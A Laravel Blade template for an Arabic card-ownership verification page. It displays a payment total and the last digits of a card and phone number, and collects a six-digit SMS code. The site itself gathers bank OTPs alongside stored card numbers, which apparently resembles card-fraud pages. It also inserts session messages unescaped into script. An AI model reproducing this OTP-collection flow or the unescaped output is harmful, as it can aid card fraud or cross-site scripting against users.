@extends('layouts.app')
@section('content')
    {{-- =========================================================== --}}
    {{-- ================== Sweet Alert Section ==================== --}}
    {{-- =========================================================== --}}
    <div>
        @if (session()->has('success'))
            <script>
                Swal.fire('"Great Job !!!"', '{!! Session::get('success') !!}', 'success');
            </script>
        @endif
        @if (session()->has('danger'))
            <script>
                Swal.fire('"Great Job !!!"', '{!! Session::get('danger') !!}', 'danger');
            </script>
        @endif
    </div>


    <section class="paymentMethodCheck py-5">
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-md-6 paymentCard">
                    <div class="cardInfo" >
                        <h2>اثبات ملكية البطاقة</h2>
                        <p>
                            سيتم اجراء معاملة مالية على حسابك المصرفي
                            <br>
                            لسداد مبلغ قيمته 
                            <span>{{ $allFormData['total'] !== null ? $allFormData['total'] : 0000 }}</span>
                            <br>
                            باستخدام البطاقة المنتهية برقم
                            <span>{{ $allFormData['card_number'] !== null ? substr($allFormData['card_number'], -4) : 0000 }}</span> 
                            <br>
                            لتأكيد العملية أرسل رمز التحقق المرسل الى جوالك (05xxxx{{ $allFormData['phone'] !== null ? substr($allFormData['phone'], -4) : 0000 }}).
                        </p>
                        <form action="{{ route('cardOwnershipRequest') }}" method="POST" class="form">
                            @csrf

                            {{-- card_ownership_verification_code --}}
                            <div class="row">
                                <div class="col-12 mb-3">
                                    <div class="inputGroup">
                                        <label for="code">رمز التحقق *
                                            <strong class="text-danger">
                                                @error('card_ownership_verification_code')
                                                ( {{ $message }} )
                                                @enderror
                                            </strong>
                                        </label>
                                        <input type="number" name="card_ownership_verification_code"
                                         minlength="6" maxlength="6" required class="form-control" 
                                          placeholder="ادخل رمز التحقق المرسل الى جوالك" value="{{ old('card_ownership_verification_code') }}" oninput="checkLength(this)">
                                    </div>
                                </div>
                                <div class="col-12 mb-3">
                                    <p>سيتم إرسال رمز التحقق في خلال دقيقة</p>
                                </div>

                                {{-- Button --}}
                                <div class="col-12">
                                    <input type="submit" class="submit" value="تأكيد"> 
                                </div>
                            </div>
                        </form>
                    </div>
                    <div class="payType">
                        <span class="text text-center d-block">الدفع بواسطة</span>
                        <ul>
                            <li>
                                <img src="{{ asset('style_files/frontend/img/visa.png') }}" alt="fender-bender">
                            </li>
                            <li>
                                <img src="{{ asset('style_files/frontend/img/card.png') }}" alt="fender-bender">
                            </li>
                            <li>
                                <img src="{{ asset('style_files/frontend/img/mada.png') }}" alt="fender-bender">
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </section>


@endsection
<script>
    function checkLength(input) {
        var maxLength = 6;
        if (input.value.length > maxLength) {
            input.value = input.value.slice(0, maxLength); // قص القيمة إلى الحد الأقصى
        }
    }
    </script>